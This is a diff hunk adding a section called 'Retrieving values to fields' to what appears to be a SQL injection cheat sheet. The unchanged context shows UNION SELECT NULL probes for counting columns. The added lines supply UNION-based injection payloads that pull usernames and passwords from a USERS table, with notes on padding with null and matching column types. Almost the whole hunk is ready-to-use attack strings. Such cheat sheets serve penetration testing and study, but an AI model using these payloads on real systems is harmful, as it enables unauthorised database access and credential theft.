@@ -17,6 +17,17 @@
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 ```
+### Retrieving values to fields
+```
+# if the number of columns and values are the same
+' UNION SELECT username,password from USERS--
+
+# if the number of columns and values are different
+# Example: 3 columns 2 values
+' UNION SELECT username,password,null from USERS--
+# Columns must support the result type (e.g.. string column can only hold a string value)
+```
+
 
 ### Retrieving multiple values in a single column (String Concatenation)
 ```
